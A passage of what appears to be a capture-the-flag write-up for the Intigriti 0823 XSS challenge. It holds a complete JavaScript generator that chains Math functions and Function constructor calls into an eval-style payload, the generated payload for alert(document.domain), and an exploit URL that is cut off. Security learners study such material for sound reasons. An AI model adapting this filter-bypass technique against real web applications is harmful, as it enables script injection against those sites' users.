id="5-putting-it-all-together">5. Putting it all together</span></h2><p>I have written a simple script to generate the code. Here is the complete code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span><span class="token parameter">init<span class="token punctuation">,</span> target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> init<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token function">bfs</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">function</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">let</span> <span class="token punctuation">[</span>path<span class="token punctuation">,</span> current<span class="token punctuation">]</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>Math<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>        <span class="token keyword">let</span> value <span class="token operator">=</span> Math<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">?.</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> newPath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Math.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token operator">...</span>path<span class="token punctuation">]</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> newPath          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">return</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>            queue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">[</span>newPath<span class="token punctuation">,</span> value<span class="token punctuation">]</span><span class="token punctuation">)</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token parameter">arrName<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">let</span> currentIndex <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> codeResult <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pop</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> content<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// if we can find it in the Math for the current index, use it</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      currentIndex<span class="token operator">++</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> mapping <span class="token operator">=</span> <span class="token punctuation">[</span>      <span class="token punctuation">[</span><span class="token string">'Math.LN2.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 0</span>      <span class="token punctuation">[</span><span class="token string">'Math.LOG2E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 1</span>      <span class="token punctuation">[</span><span class="token string">'Math.E.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 2</span>      <span class="token punctuation">[</span><span class="token string">'Math.PI.valueOf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 3</span>    <span class="token punctuation">]</span>    <span class="token comment">// try to find Math.fn[i] == char</span>    <span class="token keyword">let</span> found <span class="token operator">=</span> <span class="token boolean">false</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>mapping<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token function">findMathName</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> char<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span>mapping<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>result<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.name.at</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        currentIndex<span class="token operator">++</span>        found <span class="token operator">=</span> <span class="token boolean">true</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>found<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">continue</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// if we can't, we use integer to make a string</span>    <span class="token keyword">let</span> mathResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    mathResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> mathResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.push</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    currentIndex<span class="token operator">++</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token comment">// generate space then trim</span>  <span class="token keyword">let</span> spaceResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  spaceResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> spaceResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.prototype.trim.call'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>  <span class="token comment">//return codeResult</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'alert(document.domain)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The final result is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>round<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>hypot<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>tan<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>sqrt<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>acosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>expm1<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>trim<span class="token punctuation">.</span>call<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>join<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>call<span class="token punctuation">.</span>call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exploit URL: <a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCha